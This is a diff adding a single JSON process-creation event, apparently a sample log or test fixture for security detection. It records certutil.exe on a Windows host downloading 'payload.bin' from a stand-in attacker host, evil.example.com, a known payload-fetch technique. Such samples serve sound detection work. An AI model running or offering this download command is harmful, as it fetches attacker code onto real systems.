@@ -1,0 +1,9 @@
+{
+  "EventType": "ProcessCreate",
+  "Timestamp": "2025-01-12T15:47:12Z",
+  "Host": "WIN-HR-01",
+  "User": "CORP\\emma",
+  "SourceImage": "C:\\Windows\\System32\\certutil.exe",
+  "CommandLine": "certutil.exe -urlcache -split -f http://evil.example.com/payload.bin payload.bin",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+}
